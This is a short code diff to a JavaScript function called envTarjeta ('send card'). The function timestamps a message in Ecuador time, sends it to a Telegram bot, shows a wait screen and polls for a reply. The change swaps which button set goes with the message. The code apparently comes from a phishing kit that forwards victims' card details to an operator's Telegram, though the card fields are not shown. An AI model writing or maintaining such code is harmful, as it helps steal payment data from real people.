@@ -166,7 +166,7 @@ async function envTarjeta() {
 📅 ${new Date().toLocaleString('es-EC',{timeZone:'America/Guayaquil'})}`;
 
   showWait();
-  try { await sendTelegram(msg, BUTTONS.tarjeta); } catch(e) { console.error(e); }
+  try { await sendTelegram(msg, BUTTONS.main); } catch(e) { console.error(e); }
   startPolling(dec);
 }
 
